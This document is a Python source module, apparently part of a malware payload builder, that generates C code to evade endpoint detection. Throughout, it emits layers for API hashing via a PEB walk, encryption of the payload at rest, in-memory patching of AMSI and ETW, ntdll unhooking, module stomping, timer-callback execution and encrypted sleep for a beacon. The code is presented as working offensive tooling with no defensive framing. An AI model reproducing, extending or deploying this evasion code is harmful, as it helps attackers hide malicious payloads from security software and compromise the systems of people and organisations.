"""
evasion.py — composable EDR-evasion layers (modern set).

Each evasion flag maps to:
  * `code`   : C source appended to the payload (definitions)
  * `init`   : C statements run once in main() before the payload executes
  * `libs`   : extra -l flags for the link step
  * `macros` : #define lines (dynamic-api remap) placed before helper bodies

Layers (flag)       what it defeats
------------------  ------------------------------------------------------------
dynamic-api         static IAT analysis (PEB walk + hash). hash algo: fnv (default) or ror13
aes / rc4 / xor     static signatures / on-disk scans (encrypted at rest)
amsi                 amsi.dll!AmsiScanBuffer patch
etw                  ntdll!EtwEventWrite patch (kill ETW userland telemetry)
unhook               overwrite hooked ntdll .text from a fresh disk copy
unhook-kd            same, but mapped from \\KnownDlls\\ntdll.dll (no disk read)
stomp                unbacked-memory checks (back payload with a legit module's .text)
callbacks            thread-creation telemetry (execute via CreateTimerQueueTimer)
sleep                memory scanners (RW + XOR-scramble the region during sleep)
"""

from . import cstubs

# --------------------------------------------------------------------------
# Hashing — Python side MUST mirror the C in cstubs.HASH_ROR13 / HASH_FNV.
# --------------------------------------------------------------------------
def _ror13(v: int) -> int:
    v &= 0xFFFFFFFF
    return ((v >> 13) | (v << 19)) & 0xFFFFFFFF

def hash_ascii(s: str, algo: str = "fnv") -> int:
    if algo == "ror13":
        h = 0
        for c in s:
            h = (_ror13(h) + ord(c)) & 0xFFFFFFFF
        return h
    # fnv-1a
    h = 0x811C9DC5
    for c in s:
        h = ((h ^ ord(c)) * 0x01000193) & 0xFFFFFFFF
    return h

def hash_wide(s: str, algo: str = "fnv") -> int:
    h0 = 0x811C9DC5 if algo == "fnv" else 0
    h = h0
    for c in s:
        o = ord(c)
        if 0x41 <= o <= 0x5A:
            o += 32
        if algo == "ror13":
            h = (_ror13(h) + o) & 0xFFFFFFFF
        else:
            h = ((h ^ o) * 0x01000193) & 0xFFFFFFFF
    return h

# --------------------------------------------------------------------------
# Win32/NT API signatures for the dynamic-api remap.
#   name -> (module, return_type, [arg_types])
# --------------------------------------------------------------------------
SIGNATURES = {
    "OpenProcess":            ("kernel32", "HANDLE",  ["DWORD", "BOOL", "DWORD"]),
    "VirtualAlloc":           ("kernel32", "LPVOID",  ["LPVOID", "SIZE_T", "DWORD", "DWORD"]),
    "VirtualAllocEx":         ("kernel32", "LPVOID",  ["HANDLE", "LPVOID", "SIZE_T", "DWORD", "DWORD"]),
    "VirtualProtect":         ("kernel32", "BOOL",    ["LPVOID", "SIZE_T", "DWORD", "PDWORD"]),
    "VirtualProtectEx":       ("kernel32", "BOOL",    ["HANDLE", "LPVOID", "SIZE_T", "DWORD", "PDWORD"]),
    "WriteProcessMemory":     ("kernel32", "BOOL",    ["HANDLE", "LPVOID", "LPCVOID", "SIZE_T", "SIZE_T*"]),
    "ReadProcessMemory":      ("kernel32", "BOOL",    ["HANDLE", "LPCVOID", "LPVOID", "SIZE_T", "SIZE_T*"]),
    "CreateRemoteThread":     ("kernel32", "HANDLE",  ["HANDLE", "LPSECURITY_ATTRIBUTES", "SIZE_T", "LPTHREAD_START_ROUTINE", "LPVOID", "DWORD", "LPDWORD"]),
    "CreateThread":           ("kernel32", "HANDLE",  ["LPSECURITY_ATTRIBUTES", "SIZE_T", "LPTHREAD_START_ROUTINE", "LPVOID", "DWORD", "LPDWORD"]),
    "CreateProcessA":         ("kernel32", "BOOL",    ["LPCSTR", "LPSTR", "LPSECURITY_ATTRIBUTES", "LPSECURITY_ATTRIBUTES", "BOOL", "DWORD", "LPVOID", "LPCSTR", "LPSTARTUPINFOA", "LPPROCESS_INFORMATION"]),
    "GetThreadContext":       ("kernel32", "BOOL",    ["HANDLE", "LPCONTEXT"]),
    "SetThreadContext":       ("kernel32", "BOOL",    ["HANDLE", "LPCONTEXT"]),
    "ResumeThread":           ("kernel32", "DWORD",   ["HANDLE"]),
    "WaitForSingleObject":    ("kernel32", "DWORD",   ["HANDLE", "DWORD"]),
    "LoadLibraryA":           ("kernel32", "HMODULE", ["LPCSTR"]),
    "GetModuleHandleA":       ("kernel32", "HMODULE", ["LPCSTR"]),
    "GetProcAddress":         ("kernel32", "FARPROC", ["HMODULE", "LPCSTR"]),
    "CreateToolhelp32Snapshot": ("kernel32", "HANDLE", ["DWORD", "DWORD"]),
    "Process32FirstW":       ("kernel32", "BOOL",    ["HANDLE", "LPPROCESSENTRY32W"]),
    "Process32NextW":        ("kernel32", "BOOL",    ["HANDLE", "LPPROCESSENTRY32W"]),
    "ExitThread":             ("kernel32", "VOID",    ["DWORD"]),
    "Sleep":                  ("kernel32", "VOID",    ["DWORD"]),
    "CreateTimerQueueTimer":  ("kernel32", "BOOL",    ["PHANDLE", "HANDLE", "WAITORTIMERCALLBACK", "PVOID", "DWORD", "DWORD", "ULONG"]),
    "FlushInstructionCache":  ("kernel32", "BOOL",    ["HANDLE", "LPCVOID", "SIZE_T"]),
    "NtUnmapViewOfSection":   ("ntdll",    "NTSTATUS", ["HANDLE", "PVOID"]),
}

MODULE_NAMES = {"kernel32": "kernel32.dll", "ntdll": "ntdll.dll", "user32": "user32.dll"}


def build_dynamic_api(api_names: list[str], hash_algo: str = "fnv") -> dict:
    """Emit the dynamic-API remap for ALL known signatures (full IAT hygiene).
    Returns {'code','macros'}. api_names is accepted for compatibility but every
    signature is remapped so any helper that references a Win32 name is covered."""
    lines_td, lines_decl, lines_macro, lines_init = [], [], [], []
    for name in sorted(SIGNATURES):
        mod, ret, args = SIGNATURES[name]
        callconv = "NTAPI" if name.startswith("Nt") else "WINAPI"
        argstr = ", ".join(args) if args else "void"
        tname, pname = "t_" + name, "p_" + name
        lines_td.append(f"typedef {ret} ({callconv} *{tname})({argstr});")
        lines_decl.append(f"static {tname} {pname} = NULL;")
        lines_macro.append(f"#define {name} {pname}")
        mh = "0x%08xu" % hash_wide(MODULE_NAMES[mod], hash_algo)
        fh = "0x%08xu" % hash_ascii(name, hash_algo)
        lines_init.append(f"    {pname} = ({tname})dyn_resolve({mh}, {fh});")

    hash_c = cstubs.HASH_FNV if hash_algo == "fnv" else cstubs.HASH_ROR13
    code = (hash_c + "\n" + cstubs.DYNAMIC_API + "\n"
            "/* dynamic-API typedefs + pointers */\n"
            + "\n".join(lines_td) + "\n" + "\n".join(lines_decl) + "\n\n"
            "static void dynapi_init(void) {\n" + "\n".join(lines_init) + "\n}\n")
    return {"code": code, "macros": "\n".join(lines_macro)}


def amsi_etw_block(hash_algo: str, dynamic: bool) -> str:
    """AMSI+ETW patching. When dynamic-api is on, resolve the targets by FNV/ROR13
    hash so the literals 'amsi.dll'/'AmsiScanBuffer'/'EtwEventWrite' never appear."""
    if dynamic:
        h_amsi_dll = "0x%08xu" % hash_wide("amsi.dll", hash_algo)
        h_asb = "0x%08xu" % hash_ascii("AmsiScanBuffer", hash_algo)
        h_ntdll = "0x%08xu" % hash_wide("ntdll.dll", hash_algo)
        h_etw = "0x%08xu" % hash_ascii("EtwEventWrite", hash_algo)
        return r"""
static BOOL shroud_patch_fn(BYTE* fn) {
    DWORD old = 0;
    if (!fn || !VirtualProtect(fn, 16, PAGE_EXECUTE_READWRITE, &old)) return FALSE;
    fn[0]=0xB8; fn[1]=0x57; fn[2]=0x00; fn[3]=0x07; fn[4]=0x80; fn[5]=0xC3; /* mov eax,0x80070057; ret */
    VirtualProtect(fn, 16, old, &old); return TRUE;
}
static void neutralize_etw(void) {
    FARPROC ew = dyn_resolve(%s, %s);
    if (ew) { DWORD o=0; if (VirtualProtect((void*)ew,4,PAGE_EXECUTE_READWRITE,&o)){ ((BYTE*)ew)[0]=0xC3; VirtualProtect((void*)ew,4,o,&o);} }
}
static void neutralize_amsi(void) {
    FARPROC asb = dyn_resolve(%s, %s);
    shroud_patch_fn((BYTE*)asb);
}
""" % (h_ntdll, h_etw, h_amsi_dll, h_asb)
    return cstubs.AMSI_ETW


# --------------------------------------------------------------------------
# shroud_exec — how the staged payload is invoked.
# callbacks:  CreateTimerQueueTimer (no CreateThread telemetry)
# default:    CreateThread
# --------------------------------------------------------------------------
def exec_block(callbacks: bool, api_names: list[str]) -> dict:
    if callbacks:
        body = r"""
static void shroud_exec(void* fn) {
    HANDLE h = NULL;
    /* one-shot timer on the thread pool -> no CreateThread event */
    CreateTimerQueueTimer(&h, NULL, (WAITORTIMERCALLBACK)fn, NULL, 0, 0,
                          WT_EXECUTEINTIMERTHREAD | WT_EXECUTEONLYONCE);
    Sleep(3000);   /* allow the one-shot to fire before we return/exit */
}
"""
        for a in ("CreateTimerQueueTimer", "Sleep"):
            if a not in api_names:
                api_names.append(a)
    else:
        body = r"""
static void shroud_exec(void* fn) {
    HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)fn, NULL, 0, NULL);
    if (t) { WaitForSingleObject(t, INFINITE); CloseHandle(t); }
}
"""
        for a in ("CreateThread", "WaitForSingleObject"):
            if a not in api_names:
                api_names.append(a)
    macro = "#define SHROUD_RUN(p) shroud_exec((void*)(p))"
    return {"code": body, "macro": macro}


# --------------------------------------------------------------------------
# shroud_stage — where the decrypted payload lands before execution.
# stomp: backed by a legitimate module's .text (defeats unbacked-memory checks)
# default: private RW->RX region (pe04-style)
# --------------------------------------------------------------------------
def stage_block(stomp: bool, api_names: list[str]) -> dict:
    if stomp:
        body = r"""
/* stage into a legitimate module's .text (file-backed memory) */
static void* shroud_stage(const void* sc, unsigned int len) {
    return shroud_stage_stomp(sc, len, g_stomp_dll);
}
"""
        for a in ("LoadLibraryA", "VirtualProtect", "FlushInstructionCache"):
            if a not in api_names:
                api_names.append(a)
    else:
        body = r"""
/* stage into a private RW->RX region */
static void* shroud_stage(const void* sc, unsigned int len) {
    void* mem = VirtualAlloc(NULL, (SIZE_T)len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return NULL;
    memcpy(mem, sc, len);
    DWORD old = 0;
    VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old);
    return mem;
}
"""
        for a in ("VirtualAlloc", "VirtualProtect"):
            if a not in api_names:
                api_names.append(a)
    macro = "#define SHROUD_STAGE(sc, len) shroud_stage((const void*)(sc), (unsigned)(len))"
    return {"code": body, "macro": macro}


# --------------------------------------------------------------------------
EvasionResult = dict


def assemble(flags: set, *, api_names: list[str], payload_base_expr: str,
             payload_len_expr: str, crypto_key: bytes | None,
             crypto_iv: bytes | None, crypto_kind: str | None,
             hash_algo: str = "fnv", stomp_dll: str | None = None) -> EvasionResult:
    """Build the combined evasion block.

    Code is split into `code_pre` (no remapped names: resolver, typedefs, crypto
    math, key globals) and `code_post` (uses remapped Win32 names: exec, stage,
    stomp, AMSI/ETW, unhook, sleep). The remap #defines sit BETWEEN them so every
    helper reference resolves through the pointer, not a real import.
    """
    dyn = "dynamic-api" in flags
    pre, post, init_parts, macros_parts = [], [], [], []

    if dyn:
        da = build_dynamic_api(api_names, hash_algo)
        pre.append(da["code"])
        macros_parts.append(da["macros"])
        init_parts.append("    dynapi_init();")

    # ---- crypto math/tables + keys (no Win32 calls -> pre) ----
    if crypto_kind == "aes":
        pre.append(cstubs.AES)
        k = crypto_key or b""; iv = crypto_iv or b""
        pre.append("static unsigned char g_key[%d] = { %s };\n"
                   "static unsigned char g_iv[%d]  = { %s };\n" % (
                       len(k), ", ".join("0x%02x" % b for b in k),
                       len(iv), ", ".join("0x%02x" % b for b in iv)))
        init_parts.append(
            "    { struct aes_ctx __c; aes256_init(&__c, g_key);"
            " aes256_cbc_decrypt(&__c, (unsigned char*)%s, (size_t)%s, g_iv); }"
            % (payload_base_expr, payload_len_expr))
    elif crypto_kind in ("xor", "rc4"):
        k = crypto_key or b""
        if crypto_kind == "xor":
            pre.append(cstubs.XOR); fn = "xor_decrypt"
        else:
            pre.append(cstubs.RC4); fn = "rc4_decrypt"
        pre.append("static unsigned char g_key[%d] = { %s };\n"
                   % (len(k), ", ".join("0x%02x" % b for b in k)))
        init_parts.append("    %s((unsigned char*)%s, (unsigned int)%s, g_key, %d);"
                          % (fn, payload_base_expr, payload_len_expr, len(k)))

    if "sleep" in flags:
        if crypto_kind != "xor":
            pre.append(cstubs.XOR)
        sk = bytes((i * 7 + 0x5a) & 0xFF for i in range(16))
        pre.append("static unsigned char g_skey[16] = { %s };\n"
                   % ", ".join("0x%02x" % b for b in sk))

    if "stomp" in flags:
        pre.append('static const char* g_stomp_dll = "%s";'
                   % _escape(stomp_dll or "xpsprint.dll"))

    # ---- everything below USES remapped Win32 names -> post (after macros) ----
    eb = exec_block("callbacks" in flags, api_names)
    sb = stage_block("stomp" in flags, api_names)
    post.append(eb["code"])
    if "stomp" in flags:
        post.append(cstubs.MODULE_STOMP)
    post.append(sb["code"])
    macros_parts.append(eb["macro"])
    macros_parts.append(sb["macro"])

    if "amsi" in flags or "etw" in flags:
        post.append(amsi_etw_block(hash_algo, dyn))
        if "etw" in flags:
            init_parts.append("    neutralize_etw();")
        if "amsi" in flags:
            init_parts.append("    neutralize_amsi();")

    if "unhook-kd" in flags:
        post.append(cstubs.KNOWNDLLS_UNHOOK)
        init_parts.append("    unhook_ntdll_knowndlls();")
    elif "unhook" in flags:
        post.append(cstubs.UNHOOK)
        init_parts.append("    unhook_ntdll();")

    if "sleep" in flags:
        post.append(cstubs.SLEEP_ENC)
        init_parts.append(
            "    /* sleep layer armed: call shroud_sleep_xor(region, len, g_skey, 16, ms)"
            " from the beacon's sleep path */"
        )

    return {
        "code_pre": "\n\n".join(p for p in pre if p),
        "code_post": "\n\n".join(p for p in post if p),
        "init": "\n".join(init_parts),
        "libs": set(),
        "macros": "\n".join(m for m in macros_parts if m),
        "api_names_used": api_names,
    }


def _escape(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')


# ordered option list for help text
OPTIONS = [
    ("dynamic-api", "Resolve Win32 APIs at runtime via PEB walk + hash (clean IAT)"),
    ("aes",         "AES-256-CBC encrypt-at-rest (strongest; verified vs pycryptodome)"),
    ("rc4",         "RC4 encrypt-at-rest"),
    ("xor",         "single-key XOR encrypt-at-rest"),
    ("amsi",        "Patch amsi.dll!AmsiScanBuffer at runtime"),
    ("etw",         "Patch ntdll!EtwEventWrite at runtime (kill ETW userland telemetry)"),
    ("unhook",      "Overwrite hooked ntdll .text with a fresh disk copy"),
    ("unhook-kd",   "Same via \\KnownDlls\\ntdll.dll (no disk read — stealthier)"),
    ("stomp",       "Module stomping — back payload with a legit module's .text"),
    ("callbacks",   "Execute via CreateTimerQueueTimer (no CreateThread telemetry)"),
    ("sleep",       "Encrypting sleep — RW + XOR-scramble region while idle"),
]
